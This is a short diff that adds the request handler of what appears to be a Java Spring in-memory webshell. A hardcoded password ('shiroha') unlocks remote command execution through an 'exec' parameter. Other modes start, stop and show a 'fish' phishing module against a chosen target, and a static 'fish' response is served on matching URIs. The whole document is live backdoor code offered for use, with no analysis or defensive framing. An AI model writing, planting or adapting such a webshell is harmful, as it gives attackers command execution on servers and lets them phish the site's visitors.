@@ -1,0 +1,44 @@
+{
+    javax.servlet.http.HttpServletRequest request = $1;
+	javax.servlet.http.HttpServletResponse response = $2;
+	request.setCharacterEncoding("UTF-8");
+
+    String result = "";
+    String uri = request.getRequestURI();
+
+    result += com.stdout.springMem.SpringMemModels.StaticFish(uri);
+    if (result.length() != 0) {
+        response.getWriter().write(result);
+        return;
+    }
+
+    String password = request.getParameter("password");
+
+    if (password != null) {
+        if (password.equals("shiroha")) {
+            String model = request.getParameter("model");
+            if (model.equals("help")) {
+                result += com.stdout.springMem.SpringMemModels.help();
+            } else if (model.equals("exec")) {
+                String cmd = request.getParameter("cmd");
+                result += com.stdout.springMem.SpringMemModels.exec(cmd);
+            } else if (model.equals("fish_start")) {
+                String target = request.getParameter("target");
+                String file = request.getParameter("file");
+                result += com.stdout.springMem.SpringMemModels.fishStart(target, file);
+            } else if (model.equals("fish_stop")) {
+                result += com.stdout.springMem.SpringMemModels.fishStop();
+            } else if (model.equals("fish_show")) {
+                result += com.stdout.springMem.SpringMemModels.fishShow();
+            }
+
+
+            else if (model.equals("exit")) {
+                result += com.stdout.springMem.SpringMemModels.exit();
+            }
+
+            response.getWriter().write(result);
+            return;
+        }
+	}
+}
